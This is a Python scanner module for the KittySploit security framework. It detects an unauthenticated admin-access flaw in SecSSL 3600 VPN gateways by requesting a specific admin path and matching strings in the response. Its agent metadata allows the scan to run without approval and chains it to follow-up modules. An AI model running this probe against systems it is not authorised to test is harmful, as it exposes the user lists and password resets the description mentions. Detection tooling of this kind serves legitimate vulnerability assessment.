#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""The Secure Access Gateway SecSSL 3600 secure access gateway system has an unauthorized access vulnerability."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Secure Access Gateway SecSSLVPN - Authentication Bypass Detection',
        'description': 'The Secure Access Gateway SecSSL 3600 secure access gateway system has an unauthorized access vulnerability. An attacker can obtain the user list and modify the user account password through the vulnerability.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'vulnerability', 'secsslvpn', 'auth-bypass', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://mp.weixin.qq.com/s/BlXK_EB6ImceX83MIJGKsA',
            'https://github.com/PeiQi0/PeiQi-WIKI-Book/blob/main/docs/wiki/iot/%E5%A5%87%E5%AE%89%E4%BF%A1/%E7%BD%91%E7%A5%9E%20SecSSL%203600%E5%AE%89%E5%85%A8%E6%8E%A5%E5%85%A5%E7%BD%91%E5%85%B3%E7%B3%BB%E7%BB%9F%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E.md',
        ],
    }

    def run(self):
        r = self.http_request(method="GET", path='/admin/group/x_group.php?id=1', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_all = ('group_action.php', 'anonymous',)
        header_any = ('text/html',)
        if (all(m in body for m in body_all)) and (any(m in headers for m in header_any)):
            self.set_info(
                severity='high',
                reason="Secure Access Gateway SecSSLVPN - Authentication Bypass detected",
                path='/admin/group/x_group.php?id=1',
            )
            return True
        return False

